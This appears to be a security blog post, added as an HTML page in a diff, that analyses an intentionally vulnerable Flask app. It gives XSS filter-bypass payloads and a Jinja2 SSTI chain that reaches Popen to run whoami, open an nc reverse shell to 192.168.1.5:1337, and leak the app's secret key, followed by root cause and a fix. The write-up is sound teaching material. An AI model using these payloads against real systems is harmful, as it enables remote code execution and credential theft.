@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>XSS and SSTI in Flask | haicen.me</title>
+<link href="../../assets/css/all-nocdn.css" rel="stylesheet" type="text/css">
+<meta name="theme-color" content="#5670d4">
+<meta name="generator" content="Nikola (getnikola.com)">
+<link rel="alternate" type="application/rss+xml" title="RSS" hreflang="en" href="../../rss.xml">
+<link rel="canonical" href="https://blog.haicen.me/posts/xss-ssti-in-flask/">
+<!--[if lt IE 9]><script src="../../assets/js/html5.js"></script><![endif]--><meta name="author" content="Haicen">
+<link rel="prev" href="../confusing-script-kiddies-with-random-default-server-pages/" title="Confusing script kiddies with random default server pages" type="text/html">
+<link rel="next" href="../dumping-chrome-passwords-using-pypykatz/" title="Dumping chrome passwords using pypykatz" type="text/html">
+<meta property="og:site_name" content="haicen.me">
+<meta property="og:title" content="XSS and SSTI in Flask">
+<meta property="og:url" content="https://blog.haicen.me/posts/xss-ssti-in-flask/">
+<meta property="og:description" content="Introduction
+According to the project's home page,
+
+Flask is a lightweight WSGI web application framework. It is designed to make getting started quick and easy, with the ability to scale up to comple">
+<meta property="og:type" content="article">
+<meta property="article:published_time" content="2022-02-15T21:40:41-05:00">
+</head>
+<body>
+<a href="#content" class="sr-only sr-only-focusable">Skip to main content</a>
+
+<!-- Menubar -->
+
+<nav class="navbar navbar-inverse navbar-static-top"><div class="container">
+<!-- This keeps the margins nice -->
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-navbar" aria-controls="bs-navbar" aria-expanded="false">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="https://blog.haicen.me/">
+
+                <span id="blog-title">haicen.me</span>
+            </a>
+        </div>
+<!-- /.navbar-header -->
+        <div class="collapse navbar-collapse" id="bs-navbar" aria-expanded="false">
+            <ul class="nav navbar-nav">
+<li>
+<a href="../../archive.html">Archive</a>
+                </li>
+<li>
+<a href="../../categories/">Tags</a>
+                </li>
+<li>
+<a href="../../rss.xml">RSS feed</a>
+                </li>
+<li>
+<a href="../../pages/about-me">Contact Me</a>
+
+                
+            </li>
+</ul>
+<ul class="nav navbar-nav navbar-right"></ul>
+</div>
+<!-- /.navbar-collapse -->
+    </div>
+<!-- /.container -->
+</nav><!-- End of Menubar --><div class="container" id="content" role="main">
+    <div class="body-content">
+        <!--Body content-->
+        <div class="row">
+            
+            
+<article class="post-text h-entry hentry postpage" itemscope="itemscope" itemtype="http://schema.org/Article"><header><h1 class="p-name entry-title" itemprop="headline name"><a href="." class="u-url">XSS and SSTI in Flask</a></h1>
+
+        <div class="metadata">
+            <p class="byline author vcard p-author h-card"><span class="byline-name fn p-name" itemprop="author">
+                    Haicen
+            </span></p>
+            <p class="dateline">
+            <a href="." rel="bookmark">
+            <time class="published dt-published" datetime="2022-02-15T21:40:41-05:00" itemprop="datePublished" title="2022-02-15 21:40">2022-02-15 21:40</time></a>
+            </p>
+            
+
+        </div>
+        
+
+    </header><div class="e-content entry-content" itemprop="articleBody text">
+    <section id="introduction"><h2>Introduction</h2>
+<p>According to the project's home page,</p>
+<blockquote>
+<p>Flask is a lightweight WSGI web application framework. It is designed to make getting started quick and easy, with the ability to scale up to complex applications. It began as a simple wrapper around Werkzeug and Jinja and has become one of the most popular Python web application frameworks.</p>
+</blockquote>
+<p>Django sits at the other end of the python web service spectrum.
+Each has their own advantages and disadvantages.
+If I had to pick a downside for Flask, it is that can be easy to introduce unintentional vulnerabilities.
+This is <strong>not</strong> a problem with Flask itself, but is a result of improper sanitizing of user input.</p>
+<p>This blog post will explore two vulnerabilities in an intentionally vulnerable flask app.</p>
+<!-- TEASER_END -->
+<p>I recently saw this code posted on twitter as a "spot the vulnerability" challenge.
+I wanted to explore and do a more in depth explanation.</p>
+</section><section id="xss"><h2>XSS</h2>
+<p>For example, take the following code:</p>
+<script src="https://gist.github.com/4c111b9adce0c603e76bc0f43f628216.js"></script><noscript>
+<pre class="literal-block">def filter(user_input):
+    user_input = (user_input.replace("script", "")
+                 .replace("alert", "")
+                 .replace("prompt", "")
+                 .replace("confirm", "")
+                 .replace("\"", "\"\\")
+                 .replace("&gt;", "&amp;gt;")
+                 )
+
+    if ("script" not in user_input
+        and "alert" not in user_input
+        and "propmpt" not in user_input
+        and "confirm" not in user_input
+        ):
+
+        return user_input
+    return filter(user_input)</pre>
+</noscript>
+<p>At first glance, this seems relatively ok.
+The first thing I usually look for is whether the filter function replaces all instances of the bad strings.
+This function does correctly replace strings recursively, so that's good.
+Unfortunately, the script does fail to recognize capitalized tags, such as <code class="docutils literal">Script</code>.
+There is one problem, and that is the inability to add the closing bracket <code class="docutils literal">&gt;</code>.
+That means the standard <code class="docutils literal"><span class="pre">&lt;script&gt;alert(1)&lt;/script&gt;</span></code> is not going to work.
+Fortunately, this can be bypassed by using a different ntml entity.</p>
+<dl class="simple">
+<dt>::</dt>
+<dd>
+<p>&lt;img src=1 onerror=print()&lt;!--
+&lt;img src=1 onerror=alu0065rt(1)&lt;!--</p>
+</dd>
+</dl>
+<p>Both of these work in Firefox.
+So, what's happening here?
+The first example, <code class="docutils literal">print</code> is not one of the disallowed functions.
+This should open the print page dialog and is used to validate that the onerror function is fired.
+The second example is a unicode escape for the standard alert function.
+I believe this works because the <code class="docutils literal">\u0035</code> is not converted to <code class="docutils literal">e</code> until later on in the request lifecycle.</p>
+</section><section id="ssti"><h2>SSTI</h2>
+<p>Now that XSS is out of the way, the really critical part of this code is that there is no Server Side Template Injection (SSTI) protection.
+Below is the full code for the app, which is run using <code class="docutils literal">python <span class="pre">vulnerable-flask-app.py</span></code></p>
+<script src="https://gist.github.com/857af16801958f370492a6f4caeaaa83.js"></script><noscript>
+<pre class="literal-block">from flask import Flask, render_template_string, request
+
+app = Flask(__name__)
+
+def filter(user_input):
+    user_input = (user_input.replace("script", "")
+                 .replace("alert", "")
+                 .replace("prompt", "")
+                 .replace("confirm", "")
+                 .replace("\"", "\"\\")
+                 .replace("&gt;", "&amp;gt;")
+                 )
+
+    if ("script" not in user_input
+        and "alert" not in user_input
+        and "propmpt" not in user_input
+        and "confirm" not in user_input
+        ):
+
+        return user_input
+    return filter(user_input)
+
+@app.route("/")
+def index():
+    name = request.args.get("name")
+    if not name:
+        name = "haicen"
+    page = """
+    &lt;DOCTYPE html&gt;
+    &lt;html&gt;
+    &lt;head&gt;
+        &lt;meta charset="utf-8"&gt;
+        &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
+        &lt;title&gt;Xss!&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+    &lt;h1&gt;
+    XSS is fun
+    &lt;/h1&gt;
+    Hello, &lt;b&gt;&lt;span id="name"&gt;{}&lt;/span&gt;&lt;/b&gt;
+    &lt;/body&gt;
+    &lt;/html&gt;
+    """.format(filter(name))
+    return render_template_string(page)
+
+if __name__ == "__main__":
+    app.run(host="127.0.0.1", port=8080, debug=True)
+</pre>
+</noscript>
+<p>Flask is not the only web application framework that can have SSTI vulnerabilities.
+Things like node.js can have SSTI bugs.</p>
+<p>On the back end, flask is rendering HTML using the Jinja2 template engine.
+The template engine syntax is very simple, and relies on curly braces (much like python fstrings).
+An example is shown here: <a class="reference external" href="https://jinja2docs.readthedocs.io/en/stable/">jinja documentation</a></p>
+<p>If an attacker can controls input the template that is rendered by the template engine, they may be able to execute code.
+First, test with a simple string <code class="docutils literal">{{7*7}}</code> in the input field.
+If the result that is shown is 49, then there is a chance that RCE is possible.
+Technically, the fact that it computes that mathematical expression, means that remote code has been executed.
+However, just being able to multiply two numbers is not particularly helpful.</p>
+<img alt="/images/xss_ssti/49.png" src="../../images/xss_ssti/49.png"><p>Now I need to see if I can get into other python modules by exploring the Method Resolution Order.
+First, start with an empty string <code class="docutils literal"><span class="pre">{{''.__class__.__base__}}</span></code>
+This displays the familiar python class object syntax, <code class="docutils literal">&lt;class 'str'&gt;</code>
+Now, explore the base class <code class="docutils literal"><span class="pre">{{''.__class__.__base__}}</span></code>, which shows <code class="docutils literal">&lt;class 'object'&gt;</code>
+This gets to the top level python class 'object', so now go back down the tree.</p>
+<p><code class="docutils literal"><span class="pre">name={{''.__class__.__base__.__subclasses__()}}</span></code> produces the following:</p>
+<img alt="/images/xss_ssti/subclasses.png" src="../../images/xss_ssti/subclasses.png"><p>At this stage, the best thing to do is to copy that output into a text editor, and conver the instances of <code class="docutils literal">, &lt;class</code> to a newline.
+What is needed, is the array index of the module that is helpful to run meaningful code, such as the <code class="docutils literal">os.Popen</code> function to spawn a process.
+Popen is on line 231, and is the list index 230 (python is 0 indexed).</p>
+<p>Therefore, pointing the browser to
+<code class="docutils literal"><span class="pre">localhost:8080?name={{''.__class__.__base__.__subclasses__()[231]('whoami',</span> shell=True, <span class="pre">stdout=-1).communicate()}}</span></code>
+will show the output of the whoami command in the browser.
+A reverse shell can be obtained by using the following parameter:
+<code class="docutils literal"><span class="pre">{{''.__class__.__base__.__subclasses__()[231]('nc</span> 192.168.1.5 1337', shell=True, <span class="pre">stdout=-1).communicate()}}</span></code></p>
+<p>Most of that is pretty self explanatory, but there are a few things I wasn't familiar with before researching this.
+<code class="docutils literal">shell=True</code> is an argument to Popen() that tells it to execute in a shell.
+I admit I don't fully understand what <code class="docutils literal"><span class="pre">stdout=-1</span></code> does, but otherwise the output will go to STDOUT on the server.
+Finally, <code class="docutils literal">communicate()</code> gets the output from the shell that was spawned to run the command.</p>
+<p>To state the obvious, is very bad.</p>
+<p>Another useful template value to test is <code class="docutils literal"><span class="pre">{{config.items()}}</span></code>, which will reveal the secret key used to sign Flask cookies.</p>
+</section><section id="root-cause-analysis"><h2>Root cause analysis</h2>
+<p>The root cause of this vulnerability exists in the lines 28-43 of the gist posted above.
+By default, Flask automatically configures jinja2 to escape html strings unless the developer explicitly configures it otherwise.
+In this example, the string format utility is used rather than allowing jinja2 to do its magic.</p>
+</section><section id="remediation"><h2>Remediation</h2>
+<p>The remediation for both of these is extremely simple.
+User input shouldn't be trusted anywhere, so it really shouldn't matter if a user inputs html entities or sql statements, or anything else.
+However, if they really do need to be filtered out, the input text should be converted to lowercase for blacklist matching.
+Ultimately, simply using the template engine correctly is the best and easiest method.</p>
+<p>My proposed solution is located here:</p>
+<script src="https://gist.github.com/cd649f0dcd0a63c8defe8c13d0cdac32.js"></script><noscript>
+<pre class="literal-block">from flask import Flask, render_template_string, request
+
+app = Flask(__name__)
+
+
+@app.route("/")
+def index():
+    name = request.args.get("name")
+    if not name:
+        name = "haicen"
+    page = """
+    &lt;DOCTYPE html&gt;
+    &lt;html&gt;
+        &lt;meta charset="utf-8"&gt;
+        &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
+        &lt;title&gt;Xss!&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+    &lt;h1&gt;
+    XSS is fun
+    &lt;/h1&gt;
+    Hello, &lt;b&gt;&lt;span id="name"&gt;{{name}}&lt;/span&gt;&lt;/b&gt;
+    &lt;/body&gt;
+    &lt;/html&gt;
+    """
+    return render_template_string(page, name=name)
+
+if __name__ == "__main__":
+    app.run(host="127.0.0.1", port=8080, debug=True)
+</pre>
+</noscript>
+<p>Lastly, all the code is available on <a class="reference external" href="https://github.com/haicenhacks/vulnerable-flask-app">Github</a></p>
+</section>
+</div>
+    <aside class="postpromonav"><nav><ul class="pager hidden-print">
+<li class="previous">
+                <a href="../confusing-script-kiddies-with-random-default-server-pages/" rel="prev" title="Confusing script kiddies with random default server pages">Previous post</a>
+            </li>
+            <li class="next">
+                <a href="../dumping-chrome-passwords-using-pypykatz/" rel="next" title="Dumping chrome passwords using pypykatz">Next post</a>
+            </li>
+        </ul></nav></aside></article>
+</div>
+        <!--End of body content-->
+
+        <footer id="footer">
+            Contents © 2023         <a href="mailto:haicenhack@protonmail.com">Haicen</a> 
+            
+        </footer>
+</div>
+</div>
+
+
+            <script src="../../assets/js/all-nocdn.js"></script><!-- fancy dates --><script>
+    moment.locale("en");
+    fancydates(0, "YYYY-MM-DD HH:mm");
+    </script><!-- end fancy dates --><script>
+    baguetteBox.run('div#content', {
+        ignoreClass: 'islink',
+        captions: function(element) {
+            return element.getElementsByTagName('img')[0].alt;
+    }});
+    </script>
+</body>
+</html>
